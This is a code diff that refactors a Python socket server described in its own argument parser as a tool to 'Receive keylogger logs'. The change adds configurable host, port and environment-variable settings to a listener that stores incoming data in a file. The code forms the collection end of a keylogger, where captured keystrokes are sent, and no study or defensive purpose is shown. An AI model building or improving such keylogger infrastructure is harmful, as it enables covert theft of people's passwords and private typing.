@@ -1,22 +1,34 @@
+import argparse
+import os
 import socket
 
 file_count = 2
 
-s = socket.socket()
-s.bind(("localhost",9999))  # edit hostname and port here
-s.listen(10)
 
-print('listening on port: 9999')    # edit port here
-while True:
-    sc, address = s.accept()
+def get_host_port():
+    parser = argparse.ArgumentParser(description='Receive keylogger logs.')
+    parser.add_argument('--host', default=os.environ.get('KEYLOGGER_HOST', 'localhost'))
+    parser.add_argument('--port', type=int, default=int(os.environ.get('KEYLOGGER_PORT', '9999')))
+    args = parser.parse_args()
+    return args.host, args.port
 
-    print('Got connection from: ',address)
-    
-    f = open('server-copy.txt','wb') # open in binary    
-    for i in range(file_count):
-        l = sc.recv(1024)
-        f.write(l)    
-    f.close()
-    sc.close()
 
-s.close()
+def run_server(host, port):
+    s = socket.socket()
+    s.bind((host, port))
+    s.listen(10)
+
+    print(f'listening on {host}:{port}')
+    while True:
+        sc, address = s.accept()
+
+        print('Got connection from: ', address)
+
+        with open('server-copy.txt', 'wb') as f:
+            for _ in range(file_count):
+                f.write(sc.recv(1024))
+        sc.close()
+
+
+if __name__ == '__main__':
+    run_server(*get_host_port())
